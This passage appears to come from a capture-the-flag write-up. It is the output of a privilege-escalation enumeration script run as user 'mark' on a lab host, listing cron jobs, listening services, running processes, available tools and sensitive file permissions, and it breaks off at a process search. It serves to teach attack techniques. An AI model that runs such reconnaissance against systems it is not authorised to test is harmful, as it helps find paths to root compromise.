MAIL=/var/mail/mark
PWD=/home/mark
LANG=en_GB.UTF-8
HOME=/home/mark
SHLVL=2
LANGUAGE=en_GB:en
LOGNAME=mark
LC_CTYPE=en_US.UTF-8
SSH_CONNECTION=10.10.14.16 52860 10.10.10.58 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1001
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  189 Aug 29  2017 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:a4:ea
          inet addr:10.10.10.58  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:a4ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:425160 errors:0 dropped:22 overruns:0 frame:0
          TX packets:234257 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:29634975 (29.6 MB)  TX bytes:243721159 (243.7 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:405915 errors:0 dropped:0 overruns:0 frame:0
          TX packets:405915 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:33271465 (33.2 MB)  TX bytes:33271465 (33.2 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:8f:64:fe [ether] on ens33


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:54274         127.0.0.1:27017         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54272         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54276         ESTABLISHED -
tcp        0      0 127.0.0.1:54272         127.0.0.1:27017         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54274         ESTABLISHED -
tcp        0      0 127.0.0.1:54276         127.0.0.1:27017         ESTABLISHED -
tcp        0   6736 10.10.10.58:22          10.10.14.16:52860       ESTABLISHED -
tcp6       0      0 :::3000                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.8  38084  6112 ?        Ss   03:27   0:04 /sbin/init
root         2  0.0  0.0      0     0 ?        S    03:27   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    03:27   0:01 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   03:27   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    03:27   0:05 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    03:27   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    03:27   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    03:27   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    03:27   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   03:27   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   03:27   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    03:27   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   03:27   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   03:27   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   03:27   0:00 [khugepaged]
root        18  0.0  0.0      0     0 ?        S<   03:27   0:00 [crypto]
root        19  0.0  0.0      0     0 ?        S<   03:27   0:00 [kintegrityd]
root        20  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        21  0.0  0.0      0     0 ?        S<   03:27   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   03:27   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S<   03:27   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   03:27   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    03:27   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   03:27   0:00 [vmstat]
root        30  0.0  0.0      0     0 ?        S    03:27   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    03:27   0:00 [ecryptfs-kthrea]
root        47  0.0  0.0      0     0 ?        S<   03:27   0:00 [kthrotld]
root        48  0.0  0.0      0     0 ?        S<   03:27   0:00 [acpi_thermal_pm]
root        49  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        50  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_0]
root        58  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_0]
root        59  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_1]
root        60  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_1]
root        66  0.0  0.0      0     0 ?        S<   03:27   0:00 [ipv6_addrconf]
root        79  0.0  0.0      0     0 ?        S<   03:27   0:00 [deferwq]
root        80  0.0  0.0      0     0 ?        S<   03:27   0:00 [charger_manager]
root        82  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       131  0.0  0.0      0     0 ?        S<   03:27   0:00 [kpsmoused]
root       132  0.0  0.0      0     0 ?        S<   03:27   0:00 [ttm_swap]
root       161  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_2]
root       162  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_2]
root       163  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_3]
root       164  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_3]
root       165  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_4]
root       166  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_4]
root       167  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_5]
root       168  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_5]
root       169  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_6]
root       170  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_6]
root       171  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_7]
root       172  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_7]
root       173  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_8]
root       174  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_8]
root       175  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_9]
root       176  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_9]
root       177  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_10]
root       178  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_10]
root       179  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_11]
root       180  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_11]
root       181  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_12]
root       182  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_12]
root       183  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_13]
root       184  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_13]
root       185  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_14]
root       186  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_14]
root       187  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_15]
root       188  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_15]
root       189  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_16]
root       190  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_16]
root       191  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_17]
root       192  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_17]
root       193  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_18]
root       194  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_18]
root       195  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_19]
root       196  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_19]
root       197  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_20]
root       198  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_20]
root       199  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_21]
root       200  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_21]
root       201  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_22]
root       202  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_22]
root       203  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_23]
root       204  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_23]
root       205  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_24]
root       206  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_24]
root       207  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_25]
root       208  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_25]
root       209  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_26]
root       210  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_26]
root       211  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_27]
root       212  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_27]
root       213  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_28]
root       214  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_28]
root       215  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_29]
root       216  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_29]
root       217  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_30]
root       218  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_30]
root       219  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_31]
root       220  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_31]
root       246  0.0  0.0      0     0 ?        S    03:27   0:01 [kworker/u2:29]
root       249  0.0  0.0      0     0 ?        S    03:27   0:01 [kworker/u2:32]
root       250  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       315  0.0  0.0      0     0 ?        S<   03:27   0:00 [kworker/0:1H]
root       322  0.0  0.0      0     0 ?        S<   03:27   0:00 [raid5wq]
root       347  0.0  0.0      0     0 ?        S<   03:27   0:00 [kdmflush]
root       348  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       358  0.0  0.0      0     0 ?        S<   03:27   0:00 [kdmflush]
root       359  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       376  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       401  0.0  0.0      0     0 ?        S    03:27   0:01 [jbd2/dm-0-8]
root       402  0.0  0.0      0     0 ?        S<   03:27   0:00 [ext4-rsv-conver]
root       448  0.0  0.0      0     0 ?        S    03:27   0:21 [kworker/0:3]
root       468  0.0  0.3  28032  2740 ?        Ss   03:27   0:00 /lib/systemd/systemd-journald
root       475  0.0  0.0      0     0 ?        S<   03:27   0:00 [iscsi_eh]
root       478  0.0  0.0      0     0 ?        S    03:27   0:00 [kauditd]
root       495  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_addr]
root       496  0.0  0.2 102968  1668 ?        Ss   03:27   0:00 /sbin/lvmetad -f
root       507  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_mcast]
root       510  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_nl_sa_wq]
root       511  0.0  0.4  44360  3784 ?        Ss   03:27   0:00 /lib/systemd/systemd-udevd
root       516  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_cm]
root       519  0.0  0.0      0     0 ?        S<   03:27   0:00 [iw_cm_wq]
root       522  0.0  0.0      0     0 ?        S<   03:27   0:00 [rdma_cm]
root       875  0.0  0.0      0     0 ?        S<   03:27   0:00 [ext4-rsv-conver]
systemd+   906  0.0  0.3 100324  2392 ?        Ssl  03:27   0:03 /lib/systemd/systemd-timesyncd
message+  1025  0.0  0.4  42904  3608 ?        Ss   03:27   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1039  0.0  0.4  28548  3104 ?        Ss   03:27   0:00 /lib/systemd/systemd-logind
root      1040  0.0  0.7 275892  5744 ?        Ssl  03:27   0:00 /usr/lib/accountsservice/accounts-daemon
root      1042  0.0  0.5 629396  4116 ?        Ssl  03:27   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
syslog    1043  0.0  0.3 256400  2896 ?        Ssl  03:27   0:00 /usr/sbin/rsyslogd -n
root      1045  0.0  0.3  29008  2388 ?        Ss   03:27   0:00 /usr/sbin/cron -f
root      1049  0.0  1.2 185888  9812 ?        Ssl  03:27   0:31 /usr/bin/vmtoolsd
root      1063  0.0  0.1   4400  1268 ?        Ss   03:27   0:00 /usr/sbin/acpid
daemon    1097  0.0  0.2  26044  2076 ?        Ss   03:27   0:00 /usr/sbin/atd -f
root      1104  0.0  3.0 343176 22980 ?        S<sl 03:27   0:00 /usr/lib/snapd/snapd
root      1126  0.0  1.0 277180  7724 ?        Ssl  03:27   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1147  0.0  0.0  13376   164 ?        Ss   03:27   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
mongodb   1201  0.4 11.8 284036 89852 ?        Ssl  03:27   4:06 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1203  0.0  5.9 1009080 45396 ?       Ssl  03:27   0:08 /usr/bin/node /var/scheduler/app.js
tom       1215  0.0  9.6 1058776 73192 ?       Ssl  03:27   0:40 /usr/bin/node /var/www/myplace/app.js
root      1219  0.0  0.8  65520  6168 ?        Ss   03:27   0:00 /usr/sbin/sshd -D
root      1229  0.0  0.0   5224   164 ?        Ss   03:27   0:01 /sbin/iscsid
root      1230  0.0  0.4   5724  3536 ?        S<Ls 03:27   0:05 /sbin/iscsid
root      1283  0.0  0.2  15940  1568 tty1     Ss+  03:27   0:00 /sbin/agetty --noclear tty1 linux
root     16019  0.0  0.0      0     0 ?        S    15:56   0:00 [kworker/0:0]
root     16170  0.0  0.9  95404  6848 ?        Ss   18:28   0:00 sshd: mark [priv]
mark     16172  0.0  0.6  45248  4568 ?        Ss   18:28   0:00 /lib/systemd/systemd --user
root     16174  0.0  0.0      0     0 ?        S    18:28   0:00 [kworker/0:1]
mark     16175  0.0  0.2  61536  2216 ?        S    18:28   0:00 (sd-pam)
mark     16183  0.0  0.4  95404  3556 ?        S    18:28   0:00 sshd: mark@pts/0
mark     16184  0.0  0.6  22588  5144 pts/0    Ss   18:28   0:00 -bash
mark     16199  0.1  0.5  13500  4120 pts/0    S+   18:31   0:00 bash
mark     16200  0.0  0.4  13560  3560 pts/0    S+   18:31   0:00 bash
mark     16201  0.0  0.0   7316   708 pts/0    S+   18:31   0:00 tee -a
mark     16384  0.0  0.3  13544  2856 pts/0    S+   18:31   0:00 bash
mark     16385  0.0  0.4  37372  3428 pts/0    R+   18:31   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1.6M -rwxr-xr-x 1 root root 1.6M Jul 19  2017 /lib/systemd/systemd
320K -rwxr-xr-x 1 root root 319K Jul 19  2017 /lib/systemd/systemd-journald
608K -rwxr-xr-x 1 root root 605K Jul 19  2017 /lib/systemd/systemd-logind
140K -rwxr-xr-x 1 root root 139K Jul 19  2017 /lib/systemd/systemd-timesyncd
444K -rwxr-xr-x 1 root root 443K Jul 19  2017 /lib/systemd/systemd-udevd
 44K -rwxr-xr-x 1 root root  44K Jun 14  2017 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Aug 29  2017 /sbin/init -> /lib/systemd/systemd
768K -rwxr-xr-x 1 root root 766K Jul 26  2017 /sbin/iscsid
 52K -rwxr-xr-x 1 root root  51K Apr 16  2016 /sbin/lvmetad
504K -rwxr-xr-x 1 root root 502K Feb 20  2017 /sbin/mdadm
220K -rwxr-xr-x 1 root root 219K Jan 12  2017 /usr/bin/dbus-daemon
 20K -rwxr-xr-x 1 root root  19K Jul  5  2017 /usr/bin/lxcfs
 37M -rwxr-xr-x 1 root root  37M Jul 27  2017 /usr/bin/mongod
   0 lrwxrwxrwx 1 root root   22 Aug 30  2017 /usr/bin/node -> /etc/alternatives/node
 44K -rwxr-xr-x 1 root root  44K Feb  9  2017 /usr/bin/vmtoolsd
164K -rwxr-xr-x 1 root root 162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
 16K -rwxr-xr-x 1 root root  15K Jan 17  2016 /usr/lib/policykit-1/polkitd
 19M -rwxr-xr-x 1 root root  19M Jul 17  2017 /usr/lib/snapd/snapd
 48K -rwxr-xr-x 1 root root  47K Apr  8  2016 /usr/sbin/acpid
 28K -rwxr-xr-x 1 root root  27K Jan 14  2016 /usr/sbin/atd
 44K -rwxr-xr-x 1 root root  44K Apr  5  2016 /usr/sbin/cron
588K -rwxr-xr-x 1 root root 586K Apr  5  2016 /usr/sbin/rsyslogd
784K -rwxr-xr-x 1 root root 781K Mar 16  2017 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 304
drwxr-xr-x  2 root root 4096 Aug 30  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  2  2015 dbus
-rw-r--r--  1 root root 1264 Aug 30  2017 .depend.boot
-rw-r--r--  1 root root  955 Aug 30  2017 .depend.start
-rw-r--r--  1 root root 1019 Aug 30  2017 .depend.stop
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2300 Jul  5  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Jun  8  2017 lxd
-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 16  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Jun 14  2017 uuidd


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  g++                                4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C++ compiler
ii  gcc                                4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                              5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler
ii  gcc-5-multilib                     5.4.0-6ubuntu1~16.04.4                     amd64        GNU C compiler (multilib support)
ii  gcc-multilib                       4:5.3.1-1ubuntu1                           amd64        GNU C compiler (multilib files)


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1650 Aug 31  2017 /etc/passwd
-rw-r--r-- 1 root root 818 Jan 18 14:40 /etc/group
-rw-r--r-- 1 root root 591 Sep  3  2017 /etc/profile
-rw-r----- 1 root shadow 1190 Sep  3  2017 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 100 Jan 10  2017 /etc/sos.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 350 Aug 29  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 568 Jul 27  2017 /etc/mongod.conf
-rw-r--r-- 1 root root 144 Aug 29  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 7788 Aug 29  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 15 root root 4096 Sep  3  2017 ..


### SCAN COMPLETE ####################################
mark@node:~$
```

```sh
mark@node:/tmp$ ps -aux | grep scheduler
